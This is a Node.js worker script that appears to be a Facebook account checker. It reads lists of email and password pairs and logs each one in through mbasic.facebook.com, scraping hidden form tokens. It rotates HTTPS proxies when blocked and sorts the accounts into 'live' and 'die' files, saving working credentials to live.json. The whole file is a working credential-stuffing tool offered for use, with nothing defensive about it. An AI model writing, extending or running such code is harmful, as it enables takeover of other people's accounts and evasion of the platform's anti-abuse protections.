
const axios = require('axios')
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
const fs = require('fs');
const { Cookie } = require('tough-cookie');
const { parentPort } = require("worker_threads");
require('dotenv').config();
const HttpsProxyAgent = require('https-proxy-agent');
const { CookieJar } = require('tough-cookie');

axios.defaults.withCredentials = true;
const USERNAME = process.env.USERNAME
const PASSWORD = process.env.PASSWORD



var datr = "datr=B0FBZCm-6ltlefAz8fycrMG0"
const COOKIE_URL = "https://mbasic.facebook.com/cookie/consent_prompt/"
const ACCEPT_COOKIES = "https://mbasic.facebook.com/cookie/consent/?next_uri=https%3A%2F%2Fmbasic.facebook.com%2F"
const FB_URL = "https://mbasic.facebook.com/login"
const API_POST_URL = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8"


const getHtmlMBasic = async (url,err,instance,callback) =>{
 
  // instance.interceptors.request.use(config => {
  //   console.log('Request:', config);
  //   return config;
  // });

    const option = {
      headers: {
        // 'Access-Control-Allow-Origin': 'https://mbasic.facebook.com/login/',
        // 'Access-Control-Allow-Credentials': 'true',
        "accept-language": "en-US,en;q=0.9",
//USE PROXY'S COLDPROXY
        'cookie': 'datr=f3VDZAMW8wOPiejWVC9ALl31'
///////////////////////////////////////////////////////

        
      },
    }
    const html = await instance.get(url,option)
    .catch(function (error) {
      callback(err)
    })
    return await html
}

const acceptCookie = async (html,urlAccept,instance) =>{
    const jazoest = await dom.window.document.querySelector('input[name="jazoest"]').value;
    const lsd = await dom.window.document.querySelector('input[name="lsd"]').value;
    const payload = {
      "jazoest":jazoest,
      "lsd":lsd,
      "accept_only_essential":"0"
    }
    const option = {
      headers:{
        'user-agent': html.config.headers['User-Agent'],
        'origin':`https://mbasic.facebook.com`,
        'content-type': `application/x-www-form-urlencoded`,
        accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`
    }
    }
    const acceptCookieApi = await instance.post(urlAccept,payload,option)
    console.log("acceptCookieApi",acceptCookieApi)
    return acceptCookieApi
}

const callApiLogin = async (url,payload,option,instance,callback) =>{
    const handleLogin = await instance.post(url,payload,option)
    
    // .catch( (error)=>{
    // console.log(error)
    // })y
    return handleLogin
}

const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
  const proxy = await [...proxyList]
  if(countProxy  < proxy.length){
    countProxy = countProxy
  }else {
    countProxy=0
  }
  const proxyAgent = new HttpsProxyAgent(`http://${proxy[countProxy].PROXY_HOST}:${proxy[countProxy].PROXY_PORT}`);
  const instance = axios.create({
    httpsAgent: proxyAgent,
    timeout: 3000,
    withCredentials: true, 
  })
  if(err < 3)
  {
    try {
      const html = await getHtmlMBasic(FB_URL,err,instance,async (err)=>{
        
      })
      
      
      const dom = new JSDOM(html.data);
      const isBlock = await dom.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
      if(isBlock){
        console.log('Block getHTML')
      }
      const payload = await getValue(dom,acc,pass,err)
      let cookie
//USE PROXY'S COLDPROXY

      const cookieSd = html.headers['set-cookie'][0].split(";")[0]
      cookie = 'datr=f3VDZAMW8wOPiejWVC9ALl31' + ";" + cookieSd

/////////////////////////////////////////////////////////////////

      
      // const setCookies = await html.headers['set-cookie'].map(item =>{
      //   return item.split(";")[0]
      // })
      // cookie = await setCookies.join(";")
      
      const option = {
        headers:{
            'cookie': cookie,
            'User-Agent': html.config.headers['User-Agent'],
            'origin':`https://mbasic.facebook.com`,
            'content-type': `application/x-www-form-urlencoded`,
            accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
            "accept-language": "en-US,en;q=0.9"
        }
      }
      
      
      const handleLogin = await callApiLogin(API_POST_URL,payload,option,instance,async ()=>{
      })
      const isLogin = await new JSDOM(handleLogin.data);
      const die = await isLogin.window.document.querySelector('#login_error .p') ? await isLogin.window.document.querySelector('#login_error .p').innerHTML :''
      const live = await isLogin.window.document.querySelector('table span.s') ? await isLogin.window.document.querySelector('table span.s').innerHTML :''
      const block = await isLogin.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
        if(live){
          console.log('live')
         await callback(acc,pass,'live')
        }else if(die == 'Invalid username or password'){
          console.log(acc,pass,'die')
          await callback(acc,pass,'die')
        }else if(block)
        {
          err++
          countProxy++
          console.log("Block",block)
         await Start(acc,pass,err,proxyList,countProxy,callback)
        }else {
          await callback(acc,pass,'die')
          console.log(acc,pass,'erro')
          console.log(handleLogin.data)
        }
    } catch (error) {
      err++
      if(error.message == `Cannot read properties of null (reading 'value')`)
      {
        console.log('true')
        err=3
      }
      await Start(acc,pass,err,proxyList,countProxy,callback)
    }
  }else {
    countProxy++
     await Start(acc,pass,0,proxyList,countProxy,callback)
    
  }
}
    async function getValue(dom,acc,pass,err,callback){
      const lsd = await dom.window.document.querySelector('input[name="lsd"]').value;
      const jazoest =await dom.window.document.querySelector('input[name="jazoest"]').value;
      const m_ts = await dom.window.document.querySelector('input[name="m_ts"]').value;
      const li = await dom.window.document.querySelector('input[name="li"]').value;
      const try_number = await dom.window.document.querySelector('input[name="try_number"]').value;
      const unrecognized_tries = await dom.window.document.querySelector('input[name="unrecognized_tries"]').value;
      const login = await dom.window.document.querySelector('input[name="login"]').value;
      const bi_xrwh = await dom.window.document.getElementById('bi_xrwh').value;
      
      const payload= {
          "lsd":lsd,
          "jazoest":jazoest,
          "m_ts":m_ts,
          "li":li,
          "try_number":"0",
          "unrecognized_tries":"0",
          "email":acc,
          "pass":pass,
          "login":login,
          "bi_xrwh":"0"
        }
      return payload
}

 
const main = async (listAcc,proxyList,count) =>{
    for(let i=0;i<listAcc.length;i++){
      const pass = listAcc[i].password.trim()
      await Start(listAcc[i].email,pass,0,proxyList,i,async (acc,pas,type)=>{
        await exportData(acc,pas,type,count)
        })
    }
  
}




const exportData = async (acc,pas,type,count) =>{
  var dieList = await fs.readFileSync(`./Result/die/die${count}.json`, { encoding: 'utf-8' }) ? await fs.readFileSync(`./Result/die/die${count}.json`, { encoding: 'utf-8' }) : ''
  var liveList = await fs.readFileSync(`./Result/live/live${count}.json`, { encoding: 'utf-8' }) ? await fs.readFileSync(`./Result/live/live${count}.json`, { encoding: 'utf-8' }) : ''
  var global = await fs.readFileSync(`live.json`, { encoding: 'utf-8' })
  const globalPar = await JSON.parse(global)
  const die= dieList ? await JSON.parse(dieList) : []
  const live= liveList ? await JSON.parse(liveList) : []
  let node = {
    'die':die,
    'live':live
  }
          await node[type].push({"acc":acc,"pas":pas})
          await fs.writeFile(`./Result/${type}/${type}${count}.json`, JSON.stringify(node[type]), 'utf8', (err) => {
            if (err) {
              console.error(err);
              return;
            }
          })
        if(type == 'live')
        {
          await globalPar.push({"acc":acc,"pas":pas})
          await fs.writeFile(`live.json`, JSON.stringify(globalPar), 'utf8', (err) => {
            if (err) {
              console.error(err);
              return;
            }
          })
        }
          
          
}





parentPort.on("message",async (data) => {
  const mailList = JSON.parse(data.data)
  const proxyList = JSON.parse(data.proxy)
  main(mailList,proxyList,data.count)
});

  // Start('aaaaaaaa','aaaaaaaaaaaaaaaaa',0,0,async (acc,pas,type)=>{
  //   // await exportData(acc,pas,type)
  //   })
    // test(axios,0,'324234','234234234',()=>{

    // })


//  const test =async (axios,err,acc,pass,callback) =>{
//     const html = await getHtmlMBasic(FB_URL,err,axios,async (err)=>{
//     })
//     const dom = new JSDOM(html.data);
//     const payload = await getValue(dom,acc,pass,err)
//     console.log("payload",payload)
//     let cookie =[]
//     await html.headers['set-cookie'].map(item =>{
//       const str = item.split(';')
//       cookie = [...cookie,str[0]]
//     })
//     const option = {
//       headers:{
//           'cookie': cookie.join(';'),
//           'User-Agent': html.config.headers['User-Agent'],
//           'origin':`https://mbasic.facebook.com`,
//           'content-type': `application/x-www-form-urlencoded`,
//           accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`
//       }
//     }
//     const handleLogin = await callApiLogin(API_POST_URL,payload,option,axios,async ()=>{
//     })
//     console.log("payload",handleLogin.data)
//     console.log("pass callApiLogin",err)
//       if(handleLogin.headers['set-cookie']){
//         console.log('live')
//         callback(acc,pass,'live')
//       }else{
//         callback(acc,pass,'die')
//         console.log('die')
//       }
  
//  }